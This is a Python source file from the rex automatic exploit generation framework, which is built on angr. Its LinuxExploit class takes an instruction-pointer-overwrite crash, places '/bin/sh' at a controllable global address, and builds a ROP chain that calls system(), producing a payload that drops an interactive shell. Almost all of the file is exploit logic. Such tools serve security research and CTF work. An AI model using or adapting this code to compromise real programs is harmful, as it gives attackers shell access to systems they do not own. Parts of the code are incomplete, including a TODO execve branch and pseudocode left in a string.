import os
import angr

from rex import Vulnerability
from rex.exploit import Exploit, CannotExploit

import logging
l = logging.getLogger("rex.exploit.linux.LinuxExploit")

class LinuxExploit(Exploit):
    '''
    Exploit object which can leak flags or set registers
    '''

    def __init__(self, crash, use_rop_cache=True, rop_cache_file=None):
        '''
        :param crash: an exploitable crash object
        :param use_rop_cache: should rop gadgets be cached?
        :param rop_cache_file: which filename to use for a rop cache
        '''
        super(LinuxExploit, self).__init__(crash, use_rop_cache, rop_cache_file)

        self.shell = None

    def initialize(self):

        super(LinuxExploit, self).initialize()

        self._generate_shell()

    def drop_shell(self):
        '''
        :return: a payload which will spawn an interactive shell
        '''

        return self.shell

    def any_control(self):
        '''
        does this exploit offer anything?
        '''

        return self.shell is not None

### EXPLOIT GENERATORS

    def _generate_shell(self):
        '''
        generate and set the shell dropper
        '''

        try:
            self.shell = self._generate_a_shell()
        except CannotExploit as e:
            l.warning("cannot generate a shell dropper exploit, %s", e.message)

    def _generate_a_shell(self):

        if self.crash.crash_type == Vulnerability.IP_OVERWRITE:
            return self._ip_overwrite_rop_shell()
        else:
            raise CannotExploit

    def _ip_overwrite_rop_shell(self):

        # generate a chain which drops a shell
        # methods:
        #    * call a command executing function already in the binary (system, execve)
        #    * execute shellcode if the stack is executable

        # if system exists in the binary we need a chain to call it and a controlled string
        # at a global address
        if "system" in self._p.loader.main_bin.plt:
            return self._rop_to_call_system()
        if "execve" in self._p.loader.main_bin.plt:
            #TODO
            pass

        raise CannotExploit

    def _rop_to_call_system(self):

        # see if there's a global address we can place our string to "/bin/sh"

        cmd = "/bin/sh\x00"
        cmd_str_addr = None
        cmd_str_addr_constraint = None
        for addr in self._global_control():
            constraint = self.state.memory.load(addr, len(cmd)) == self.state.BVV(cmd)
            if self.state.se.satisfiable(extra_constraints=(constraint,)):
                cmd_str_addr = addr
                cmd_str_addr_constraint = constraint
                break


        '''
        if cmd_str_addr is None:
            read in the cmd str
        '''

        if cmd_str_addr is None:
            raise CannotExploit("cannot write command string into binary")

        chain = self.rop_engine.func_call("system", [cmd_str_addr])

        st, chain_addr, offered_size = self._eip_overwrite_with_chain(chain)

        st.add_constraints(cmd_str_addr_constraint)
        st.add_constraints(st.memory.load(chain_addr, chain.payload_len) == self.state.BVV(chain.payload_str()))

        return st.posix.dumps(0)
